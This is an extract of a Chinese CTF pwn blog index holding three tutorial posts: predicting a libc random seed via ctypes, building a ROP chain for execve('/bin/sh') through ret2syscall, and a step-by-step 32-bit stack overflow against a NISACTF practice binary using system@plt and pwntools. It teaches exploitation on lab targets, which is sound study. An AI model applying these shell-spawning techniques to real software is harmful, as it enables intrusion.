1.cdll.LoadLibrary的用法：看了很多篇猜数字的题解啊，竟然没有一个人对这个函数用法有解释，那没办法了，只能自己wiki了 这个函数就是在python中重新加载文件库 还是有限制的：在64位的windows系统中，一个64位进程不能加载一个32位dll，同理一个32位进程也不能加载一个64位dll。 查资料的时候还看到这个限制的特殊情况，不过看不明白，估计了解的价值也不大，先丢在这，有空来填这个坑，感兴趣的可以自己先看(3条消息) python 调用 C++ dll 32位 64位 问题 ctypes.cdll.LoadLibrary_wowocpp的博客-CSDN博客_python调用32位dll 还有一种更深的用法是这个代码库将允许原生Linux程序从一个WindowsDLL文件中加载或调用功能函数 (3条消息) linux运行dll文件命令,LoadLibrary：一款能够允许Linux程序从DLL文件中加载或调用函数的工具…_七分醉玲珑的博客-CSDN博客 因为涉及到linux和windows的进程间通信和内核相关知识，我自己也还没有搞懂，留个坑吧，看以后有没有时间填上 2.伪随机这里介绍一下c语言中的伪随机 一些基础的c语言知识这里就不多解释了，比如说srand用法和种子的概念 先看看一段代码吧 int main()&#123; for(int i=0; i&lt;10; i++) &#123; printf(&quot;%4d&quot;,rand()); &#125; printf(&quot;\\n&quot;); return 0;&#125; 输出10个随机数，我们两次运行试试 生成的随机数都一样？ 我们不妨这么理解，所谓的rand函数就是根据每个种子分配一张表格，所谓的随机数是从这个表格调用的，所以当我们第二次运行时，由于种子没改变，那么这张表格的数据也不会改变 那么我们如何获得真正意义上的随机数？想一下有什么东西的数据是一直在变化的 我们把目光瞄向时间，函数srand( (unsigned)time( NULL ) ) 中time返回的是1970年1月1日0点到现在时间流失的秒数值 因此，我们这下没法得知种子是多少，也就无法知道这个种子对应的随机数表是什么 但是我们重加载了libc库，同步获取了time返回的种子值，由于time是以秒作为单位的，我们每次for循环得出的随机数和题目的随机数几乎没有差距，所以这道题的随机数就呼之欲出了 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"}],"tags":[]},{"title":"ROP","slug":"ROP","date":"2022-09-17T01:26:39.000Z","updated":"2023-09-14T17:20:40.000Z","comments":true,"path":"2022/09/17/ROP/","link":"","permalink":"http://example.com/2022/09/17/ROP/","excerpt":"","text":"动态链接和静态链接静态链接和动态链接的相关概念，我们在栈溢出篇曾粗略提到过 我们说到，为了防止每次调用函数都需要将函数的libc库拷贝到文件中，加大文件的存储占用 不如在程序运行时将动态库加载到内存中，多个程序运行只需要调用一份 静态库特点：1.静态库对函数库的链接是放在编译时期完成的2.程序在运行时与函数库再无瓜葛，移植方便。3.浪费空间和资源，因为所有相关的目标文件与牵涉到的函数库被链接合成一个可执行文件4.如果静态库进行更新则应用该库的所有程序都需要重新编译（全量更新）。 动态库特点：1.动态库把对一些库函数的链接载入推迟到程序运行时期。2.可以实现进程之间的资源共享。（因此动态库也称为共享库）3.将一些程序升级变得简单。4.甚至可以真正做到链接载入完全由程序员在程序代码中控制（显示调用） 还是不太清楚？我们这样来理解，我们在吃饭前需要备好碗筷 如果我们每吃一道菜就要准备一副碗筷，这是静态库 如果我们只用一副碗筷就吃完所有菜，这是动态库 ROP在明白了动态库和静态库的区别后，我们接着讲栈溢出的相关内容 我们已经学过的栈溢出，需要函数中有着出题人给我们预先准备好的system函数和binsh字符串 如果没有呢？我们又该从何入手 在开始之前，我们先明白几个概念 1、rop：在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 2、gadgets：在程序中的指令片段，有时我们为了达到我们执行命令的目的，需要多个gadget来完成我们的功能。gadget最后一般都有ret，因为我们需要将程序控制权(EIP)给下一个gadget。即让程序自动持续的选择堆栈中的指令依次执行。(涉及到接下来的栈变化情况，现在看不懂的没关系，接下来会图片演示详讲) 3、ropgadgets：一个pwntools的一个命令行工具，用来具体寻找gadgets的。例如：我们从pop、ret序列当中寻找其中的eax 4.在linux系统中，函数的调用是有一个系统调用号的 我们接下来详细介绍这个系统调用号 系统调用号Linux 的系统调用通过 int 80h 实现，用系统调用号来区分入口函数 而我们需要用到的system(&#x2F;bin&#x2F;sh)函数的系统调用号为11，也就是0xb 他的系统调用规范是execve(“&#x2F;bin&#x2F;sh”, 0,0) 那么我们如何向栈中传入这一串的数据来达到我们调用system的目的呢？ 计算机语言分为高级语言和低级语言 我们先要知道，像c语言，python语言这样的，是属于高级语言 高级语言指较接近自然语言和数学公式的编程，基本脱离了机器的硬件系统，用人们更易理解的方式编写程序 低级语言包括机器语言(二进制语言)和汇编语言 这两种语言都是面向机器的语言，和具体机器的指令系统密切相关 所以我们输入的是system(&#x2F;bin&#x2F;sh)，但是实际上计算机他不能读懂这段代码是什么意思 他要先进行编译，将其转化为自己能读懂的汇编语言 所以system(&#x2F;bin&#x2F;sh)用汇编语言来表示也可以转化为 pop eax 系统调用号载入， execve为0xbpop ebx 第一个参数， /bin/sh的stringpop ecx 第二个参数，0pop edx 第三个参数，0int 0x80 仔细思考一下，静态链接是将静态库在程序运行前就载入于文件中 所以，我们有了思路，既然静态链接导致的后果是文件过于庞大，因为其加载了静态库 所以我们可以在程序文件中搜索特定的汇编语言，将其一条条串连起来 这里我觉得有必要再插入一段说明，关于这个串连 我们是如何进行栈溢出的，实际上是覆盖ret addr来达到我们控制程序执行流的目的对吧 所以我们只需要确保每一个汇编代码执行完了以后都有一个ret指令，我们就可以使程序执行流按照我们预想的方式来跳转 那么我们又该如何寻找这些汇编代码呢？这里就用到了我们刚才提过的ropgadgets工具 ropgadgets我们在linux终端中输入 ROPgadget -binary 文件名 --only&quot; 要搜索的 &quot; 于是，我们得到了 pop eax&#x2F;ebx 的地址 这里是是否还有一个疑问？欸他这里是连在一起的啊，就比如第一行pop eax和pop ebx是连在一起的怎么办？ 很简单，我们只需要同时传入他们各自所需要的参数即可 我们再搜索ebx.ecx.edx 以及int 80h系统调用和bin&#x2F;sh 到这里为止，我们就清楚了rop构造执行流的完整思路，接下来我们用一道例题来演示 ret2syscall我们先用checksec检查他开启了哪些保护机制以及查看他的位数 打开了NX保护机制，我们无法在栈中读写数据，所以只能采用构造ROP执行流的办法 再用ida打开看一下main函数写了什么 可以看到gets函数，判断应该也是一个栈溢出题 但是没有给我们提供system函数地址和字符串binsh地址 所以我们这里利用ROP构造 我们来查找pop eax等汇编代码的地址 得到了地址之后，我们开始构造payload if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]},{"title":"栈溢出","slug":"32位栈溢出","date":"2022-09-15T04:26:15.000Z","updated":"2023-09-14T17:21:24.000Z","comments":true,"path":"2022/09/15/32位栈溢出/","link":"","permalink":"http://example.com/2022/09/15/32%E4%BD%8D%E6%A0%88%E6%BA%A2%E5%87%BA/","excerpt":"","text":"继上文点到栈溢出的基础原理，本文来详细演示如何完成一题栈溢出 checksec的使用及保护机制了解操作系统提供了许多安全机制来尝试降低或阻止缓冲区溢出攻击带来的安全风险 在我们开始尝试做题之前，我们先得知道这道题开启了哪些安全机制，我们又该如何绕过其安全机制 这里便使用到了checksec工具 Arch：程序架构信息。判断是拖进64位IDA还是32位？exp编写时p64还是p32函数？ RELRD:Relocation Read-Only (RELRO) 此项技术主要针对 GOT 改写的攻击方式。它分为两种，Partial RELRO 和 Full RELRO。部分RELRO 易受到攻击，例如攻击者可以atoi.got为system.plt，进而输入&#x2F;bin&#x2F;sh\\x00获得shell完全RELRO 使整个 GOT 只读，从而无法被覆盖，但这样会大大增加程序的启动时间，因为程序在启动之前需要解析所有的符号。 （看不懂没有关系 ，后续学习将会接触到plt和got表的相关知识） Stack：由上文可知，在我们进行栈溢出的时候，只需覆盖ret addr就能达到操控程序执行流的目的，但此项保护机制，在栈中会随机生成一段数据，在函数返回的时候，会检验这段数据是否正确，如果不正确，程序就会崩溃退出，这段数据在liunx中被称为canary NX:NX enabled如果这个保护开启就是意味着我们对栈中数据没有执行权限，我们无法在栈中自由更写，但是通过ROP构造执行流的办法可以绕过这个保护(同样将在接下来的学习中讲到) PIE:pie保护机制和ASLR相类似，我们已经知道每个数据在计算机中都有自己相应的地址，通过寻址计算机可以成功调用他们，ASLR 将程序运行时的堆栈以及共享库的加载地址随机化，而 PIE 技术则在编译时将程序编译为位置无关, 即程序中的地址在每次运行时都会发生变化，我们将在后续的学习中接触到pie ida使用和漏洞分析通过checksec我们可以得知此题为32位，我们将其拖进32位ida查看 左边的function name是此二进制文件中的函数列表，通常主函数的名称是main 右侧便为此文件的汇编代码 我们可以按下f5进行ida反编译，将其转化为c语言代码的形式 main函数的组成相当简单，只有一个子函数shell，我们点进去看看 第三行，定义了一个buf变量，那么后面的esp+0h和ebp-48h是什么意思？ 我们进行栈溢出的目的是为了覆盖ret addr 从而将程序的返回地址修改成我们需要的，此时read读入的变量buf的位置就是位于ebp再往上0x48处的栈顶 所以我们可以得知，我们赋值的变量buf离ret addr差了0x48+0x4个字节 这里为什么还要加4？如果是64位呢，还是加4吗 我们之前说过了，一个字长对应的字节是根据位数的不同来决定的 此时需要在0x48的数据上再加上0x4是因为我们离ret addr还隔着一个ebp，一个字长的距离 接下来我们看回程序，输出语句”welcome to NISACTF” 在return处调用了函数read，读入了0x60字长的数据，而此时我们需要溢出的数据长度为0x48+0x4+0x4(我们用来覆盖ret addr的数据) 这里就出现了栈溢出漏洞，但是此时我们还需要system(&#x2F;bin&#x2F;sh)的地址，以达到获取flag的目的 我们可以依法炮制，翻阅其他函数的内容，我们发现这题的作者并没有直接给我们 那么system(&#x2F;bin&#x2F;sh)就需要我们自己构造 我们接着使用shift+f12来打开string窗口，一键找出所有的字符串 我们惊喜的发现，在data段(不清楚什么是data段的，请仔细观看谢师傅的视频，为虚拟内存映射的相关知识)中存在字符串&#x2F;bin&#x2F;sh 拥有这段字符串意味着什么？ 我们知道，函数的执行一般需要参数 例如system(&#x2F;bin&#x2F;sh)中的&#x2F;bin&#x2F;sh便是system的参数 所以，我们接下来的任务就是去找到system函数的地址，并且把&#x2F;bin&#x2F;sh这段字符串作为参数，就可以实现system(&#x2F;bin&#x2F;sh) plt表和got表这里举一个简单的例子 某公司开发了一款软件，实现的代码调用了大量的函数，这些函数的每次实现都需要在文件(这个软件)中对应的前置来实现他 这样子就增大了文件的体积 但是如果将实现这些函数的前置在程序运行时载入到内存中呢？ 这样每一款软件都无需额外的内存占用，并且用户也能成功运行 所以这里就出现了plt表和got表的概念 当我们需要调用system函数时，他会去自动寻找system的plt表 其plt表中存储了system函数的got表的地址 其就是system在libc(libc同样在谢师傅的视频中有所介绍)中的地址 但是我们在第一次调用system函数的时候，其got表中的地址并不知道system在libc中的哪里 于是第一次调用无果后，system的plt表便会收到消息，去给got表找到system在libc的位置 经过原定好的代码实现，plt表便查找到了libc中system的地址，并将其填充给了got表 接下来plt表再去got表中，他就得知了地址，就可以成功调用system函数 所以我们可以将整个流程用下图来展示 而在之前程序已经调用了system函数进行echo 字符串，所以我们此时再去system的plt表中就能获取到system在libc中的地址 这里你可能会无法理解，但是在初期的学习我们只需要记住，plt表是调用该函数，got表中存的地址是为了获得真实地址 发现漏洞后，接下来就要进行shellcode的编写，开始攻击 以下shellcode的编写需要python基础，这里同样不做解释，请自行学习） 但我个人是没有进行任何额外的python学习(截止到我学习到堆)，不知道这条路是否合理化，请根据自己在学习中遇到的情况自行斟酌 exp的编写 –第二行建立与靶场的联系(概念不做解释，自行查找)的联系，名称不一定要是io，“ ”中为ip地址，逗号后为端口) –第三行为后续我们获得system的plt表内容的前置条件，括号中为”.&#x2F;文件名” –第四行，接收程序的输出内容，简单的是xxx.recv() [xxx为你先前命名的名称，比如我的io] io.recv()将会接收一行的数据，以\\n为结束判定 而io.recvuntil(“ “)将会接收到” “内的数据才停止，并且包括“ ”内的数据 如果不想接收“ ”内的数据，可以这样编写io.recvuntil(“hello”,drop &#x3D; True) –第五行，为变量system_addr赋值 赋值的内容为system的plt表中的内容 –第六行，编写payload，cyclic创建括号内自定义字长的垃圾数据用来填充ret addr前的内容 随后我们要注意p32()这个语法，为什么要使用它？ 首先，send系列只能传参字符串，recv接收回来的也只能是字符串，这是因为网络传输的规定! 所以，对于地址值0x1234，就只有变成字符串传出去 你应该也能猜到为什么是p32，64位程序使用的便是p64 接下来我们可以理解p32(0x804a024)就是字符串&#x2F;bin&#x2F;sh的地址，那么中间的0xabcdabc又是什么？ 这里先粗略进行一个介绍，具体的介绍将在后续进行一个专门的文章(可见其中的复杂) 我们只需要知道，正常的调用system（即非使用call system的汇编代码地址），要想成功为其传参，函数和参数之间要有一个垃圾数据 所以他的形式可以不为abcdabc可以是任何符合格式的地址 –第七行，发送我们构造好的payload，进行栈溢出攻击 最后，io.interactive()来与终端交互，如果pwn成功，那么我们就可以使用ls来查看当前目录下有哪些文件 我们利用python3（需要你的虚拟机中安装好了python3）发送这段exp试试 可以看到我们输入ls后，成功列出了目录的文件，我们发现了一个名为flag的文件，那么这就是我们的最后答案了 cat flag(liunx使用命令请自行百度) 答案到手！ 在阅读完本文后，相信你对栈溢出的解法已经有了一个大致的理解，接下来请自行前往ctfshow或者其他平台独立解题 if (typeof lightGallery !== 'undefined') { var options = { selector: '.gallery-item' }; lightGallery(document.getElementsByClassName('.article-gallery')[0], options); }","categories":[{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]}],"categories":[{"name":"extra","slug":"extra","permalink":"http://example.com/categories/extra/"},{"name":"wp","slug":"wp","permalink":"http://example.com/categories/wp/"},{"name":"heap","slug":"heap","permalink":"http://example.com/categories/heap/"},{"name":"iot","slug":"iot","permalink":"http://example.com/categories/iot/"},{"name":"stack","slug":"stack","permalink":"http://example.com/categories/stack/"}],"tags":[]}